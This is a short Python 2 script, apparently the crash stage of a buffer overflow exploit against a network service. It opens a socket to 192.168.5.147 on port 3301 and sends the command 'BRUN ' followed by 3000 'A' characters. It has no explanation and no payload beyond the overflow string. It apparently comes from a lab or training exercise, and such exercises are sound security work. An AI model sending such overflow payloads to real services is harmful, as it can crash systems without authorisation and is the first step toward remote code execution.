import socket
import sys

buffer = 'A' * 3000
command = 'BRUN '
data = command + buffer

print '[*] Sending data: ' + data
s = socket.create_connection(('192.168.5.147',3301))
s.sendall(data)
s.close()
